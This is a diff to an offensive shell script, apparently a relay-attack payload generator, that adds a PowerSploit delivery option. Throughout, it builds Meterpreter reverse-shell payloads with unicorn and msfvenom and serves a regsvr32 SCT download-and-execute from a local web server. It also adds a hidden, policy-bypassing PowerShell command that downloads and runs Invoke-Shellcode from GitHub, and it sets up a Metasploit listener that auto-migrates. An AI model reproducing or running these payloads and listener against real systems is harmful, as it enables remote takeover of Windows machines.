@@ -176,24 +176,26 @@ fi
 
 echo "Select Payload Delivery Method"
 
-select method in unicorn sct
+select method in unicorn sct powersploit
 do
     case $method in
       unicorn)
          echo "Generating Payload..."
          spinner
-         python unicorn/unicorn.py windows/meterpreter/reverse_tcp $lhost $lport >> relayer.log
+         metapayload=windows/meterpreter/reverse_tcp
+         python unicorn/unicorn.py $metapayload $lhost $lport >> relayer.log
          payload=$(cat powershell_attack.txt)
          break
          ;;
       sct)
          echo "Generating sct file and launching HTTP Server on port 8080"
          spinner
+         metapayload=windows/meterpreter/reverse_tcp
          cd ps1encode/
          sed -i '99c\    system("msfvenom -p #{$lpayload} LHOST=#{$lhost} LPORT=#{$lport} --arch x86 -e x86/shikata_ga_nai -b STRING --platform windows --smallest -f raw > raw_shellcode_temp")' ps1encode.rb
          sed -i s/STRING/"'\\\\\\\\\\{x00}'"/g ps1encode.rb
          sed -i s/{x00}/x00/g ps1encode.rb
-         ./ps1encode.rb --PAYLOAD windows/meterpreter/reverse_tcp --LHOST=$lhost --LPORT=$lport -t sct
+         ./ps1encode.rb --PAYLOAD $metapayload --LHOST=$lhost --LPORT=$lport -t sct
          cd ..
          mkdir site
          cp ps1encode/index.sct site/index.sct
@@ -201,6 +203,13 @@ do
          python -m SimpleHTTPServer 8080 >/dev/null 2>&1 &
          cd ..
          payload="regsvr32 /s /n /u /i:http://$lhost:8080/index.sct scrobj.dll"
+         break
+         ;;
+      powersploit)
+         echo "Creating Payload using powershell script from Powersploit"
+         spinner
+         metapayload=windows/meterpreter/reverse_https
+         payload="Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload $metapayload -Lhost $lhost -Lport $lport -Force"
          break
          ;;
       *)
@@ -235,12 +244,12 @@ if [ "$select" = "1" ]; then
   echo ""
   echo "You Selected to run the Listener on this System"
   echo "Setting up the Listener"
-  msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set autorunscript post/windows/manage/migrate; exploit -j;"
+  msfconsole -q -x "use exploit/multi/handler; set payload $metapayload; set LHOST $lhost; set LPORT $lport; set autorunscript post/windows/manage/migrate; exploit -j;"
 elif [ "$select" = "2" ]; then
   echo ""
   echo "Use msfhandler.rc as msfconsole resource on your listener system"
   echo "use exploit/multi/handler" >> msfhandler.rc
-  echo "set payload windows/meterpreter/reverse_tcp" >> msfhandler.rc
+  echo "set payload $metapayload" >> msfhandler.rc
   echo "set LHOST $lhost" >> msfhandler.rc
   echo "set LPORT $lport" >> msfhandler.rc
   echo "run" >> msfhandler.rc
